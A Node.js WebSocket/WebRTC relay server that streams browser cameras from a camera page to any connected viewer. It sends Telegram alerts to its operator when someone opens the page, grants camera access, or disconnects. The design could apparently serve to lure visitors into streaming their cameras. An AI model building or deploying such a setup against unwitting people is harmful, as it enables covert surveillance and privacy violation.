const http = require("http");
const fs = require("fs");
const path = require("path");
const https = require("https");
const WebSocket = require("ws");

const PORT = process.env.PORT || 10000;

const TELEGRAM_BOT_TOKEN =
  process.env.TELEGRAM_BOT_TOKEN || "";

const TELEGRAM_CHAT_ID =
  process.env.TELEGRAM_CHAT_ID || "";


/* =========================
   TELEGRAM
========================= */

function telegram(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return;
  }

  const data = new URLSearchParams({
    chat_id: TELEGRAM_CHAT_ID,
    text: message
  }).toString();

  const req = https.request({
    hostname: "api.telegram.org",
    path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
    method: "POST",

    headers: {
      "Content-Type":
        "application/x-www-form-urlencoded",

      "Content-Length":
        Buffer.byteLength(data)
    }
  });

  req.on("error", () => {});

  req.write(data);
  req.end();
}


/* =========================
   HELPERS
========================= */

function send(ws, message) {
  if (
    ws &&
    ws.readyState === WebSocket.OPEN
  ) {
    try {
      ws.send(JSON.stringify(message));
    } catch {}
  }
}


function makeId() {
  return (
    Math.random()
      .toString(36)
      .slice(2, 8) +
    Date.now()
      .toString(36)
      .slice(-4)
  );
}


/* =========================
   HTTP SERVER
========================= */

const server = http.createServer((req, res) => {

  const routes = {
    "/": "camera.html",

    "/camera":
      "camera.html",

    "/camera.html":
      "camera.html",

    "/viewer":
      "viewer.html",

    "/viewer.html":
      "viewer.html"
  };


  const pathname = new URL(
    req.url,
    `http://${req.headers.host || "localhost"}`
  ).pathname;


  const file = routes[pathname];


  if (!file) {
    res.writeHead(404, {
      "Content-Type":
        "text/plain; charset=utf-8"
    });

    return res.end("Not found");
  }


  /*
     Telegram notification when
     someone opens camera page.
  */

  if (
    pathname === "/" ||
    pathname === "/camera" ||
    pathname === "/camera.html"
  ) {
    telegram(
      "🔔 Someone opened the camera page.\n" +
      "Camera permission is still required."
    );
  }


  const filePath =
    path.join(__dirname, file);


  fs.readFile(
    filePath,
    (err, data) => {

      if (err) {
        console.error(
          "File error:",
          err.message
        );

        res.writeHead(500, {
          "Content-Type":
            "text/plain; charset=utf-8"
        });

        return res.end(
          "Server error"
        );
      }


      res.writeHead(200, {
        "Content-Type":
          "text/html; charset=utf-8",

        "Cache-Control":
          "no-store"
      });


      res.end(data);
    }
  );
});


/* =========================
   WEBSOCKET SERVER
========================= */

const wss =
  new WebSocket.Server({
    server
  });


/*
   cameraId -> WebSocket
*/
const cameras =
  new Map();


/*
   viewerId -> WebSocket
*/
const viewers =
  new Map();


/* =========================
   BROADCAST
========================= */

function broadcast(message) {

  for (const ws of viewers.values()) {
    send(ws, message);
  }

}


/* =========================
   WEBSOCKET CONNECTION
========================= */

wss.on(
  "connection",
  (ws, req) => {

    const pathname =
      new URL(
        req.url || "/",
        "http://localhost"
      ).pathname;


    /* =====================
       CAMERA
    ===================== */

    if (pathname === "/camera") {

      const cameraId =
        makeId();


      cameras.set(
        cameraId,
        ws
      );


      console.log(
        `📷 Camera connected: ${cameraId}`
      );


      /*
         Tell camera its ID.
      */

      send(ws, {
        type: "role",
        role: "camera",
        cameraId
      });


      /*
         Tell existing viewers
         that a camera appeared.
      */

      broadcast({
        type: "camera-online",
        cameraId
      });


      telegram(
        "📷 Camera page connected.\n" +
        `Camera ID: ${cameraId}\n` +
        "The user must still allow camera access."
      );


      /* =====================
         CAMERA MESSAGES
      ===================== */

      ws.on(
        "message",
        raw => {

          let msg;

          try {
            msg = JSON.parse(
              raw.toString()
            );
          } catch {
            return;
          }


          if (!msg || typeof msg !== "object") {
            return;
          }


          /*
             Camera has successfully
             obtained camera permission
             and started streaming.
          */

          if (
            msg.type === "camera-live"
          ) {

            console.log(
              `🟢 Camera live: ${cameraId}`
            );


            telegram(
              "🟢 Camera permission was granted.\n" +
              `Camera ID: ${cameraId}`
            );


            broadcast({
              type: "camera-live",
              cameraId
            });


            return;
          }


          /*
             Forward WebRTC signaling
             messages to the requested viewer.
          */

          if (msg.toViewerId) {

            const viewer =
              viewers.get(
                msg.toViewerId
              );


            if (viewer) {

              send(
                viewer,
                {
                  ...msg,
                  cameraId
                }
              );

            }

          }

        }
      );


      /* =====================
         CAMERA ERROR
      ===================== */

      ws.on(
        "error",
        () => {
          console.log(
            `⚠️ Camera WebSocket error: ${cameraId}`
          );
        }
      );


      /* =====================
         CAMERA CLOSED
      ===================== */

      ws.on(
        "close",
        () => {

          if (
            cameras.get(cameraId) !== ws
          ) {
            return;
          }


          cameras.delete(
            cameraId
          );


          console.log(
            `🔴 Camera disconnected: ${cameraId}`
          );


          broadcast({
            type: "camera-offline",
            cameraId
          });


          telegram(
            "🔴 Camera disconnected.\n" +
            `Camera ID: ${cameraId}`
          );

        }
      );


      return;
    }


    /* =====================
       VIEWER
    ===================== */

    if (pathname === "/viewer") {

      const viewerId =
        makeId();


      viewers.set(
        viewerId,
        ws
      );


      console.log(
        `👁️ Viewer connected: ${viewerId}`
      );


      /*
         Send viewer its ID
         and currently connected cameras.
      */

      send(ws, {
        type: "role",
        role: "viewer",
        viewerId,

        cameras:
          [...cameras.keys()]
      });


      /*
         Send camera-online events
         individually as well.
      */

      for (
        const cameraId
        of cameras.keys()
      ) {

        send(ws, {
          type: "camera-online",
          cameraId
        });

      }


      /* =====================
         VIEWER MESSAGES
      ===================== */

      ws.on(
        "message",
        raw => {

          let msg;

          try {
            msg = JSON.parse(
              raw.toString()
            );
          } catch {
            return;
          }


          if (!msg || typeof msg !== "object") {
            return;
          }


          /*
             Viewer wants to establish
             a WebRTC connection with
             a particular camera.
          */

          if (
            msg.type === "viewer-ready" &&
            msg.cameraId
          ) {

            const camera =
              cameras.get(
                msg.cameraId
              );


            if (camera) {

              send(camera, {
                type:
                  "viewer-ready",

                viewerId
              });

            }


            return;
          }


          /*
             Forward all other WebRTC
             signaling messages to camera.
          */

          if (msg.cameraId) {

            const camera =
              cameras.get(
                msg.cameraId
              );


            if (camera) {

              send(
                camera,
                {
                  ...msg,

                  toViewerId:
                    viewerId
                }
              );

            }

          }

        }
      );


      /* =====================
         VIEWER ERROR
      ===================== */

      ws.on(
        "error",
        () => {
          console.log(
            `⚠️ Viewer WebSocket error: ${viewerId}`
          );
        }
      );


      /* =====================
         VIEWER CLOSED
      ===================== */

      ws.on(
        "close",
        () => {

          if (
            viewers.get(viewerId) === ws
          ) {

            viewers.delete(
              viewerId
            );

          }


          console.log(
            `👁️ Viewer disconnected: ${viewerId}`
          );

        }
      );


      return;
    }


    /* =====================
       UNKNOWN WEBSOCKET PATH
    ===================== */

    console.log(
      `❌ Unknown WebSocket path: ${pathname}`
    );


    try {
      ws.close(
        1008,
        "Invalid WebSocket path"
      );
    } catch {}

  }
);


/* =========================
   SERVER ERROR
========================= */

server.on(
  "error",
  err => {

    console.error(
      "Server error:",
      err
    );

  }
);


/* =========================
   START SERVER
========================= */

server.listen(
  PORT,
  "0.0.0.0",
  () => {

    console.log(
      `🚀 Multi-camera server running on port ${PORT}`
    );

    console.log(
      `📷 Camera route: /camera`
    );

    console.log(
      `👁️ Viewer route: /viewer`
    );

  }
);
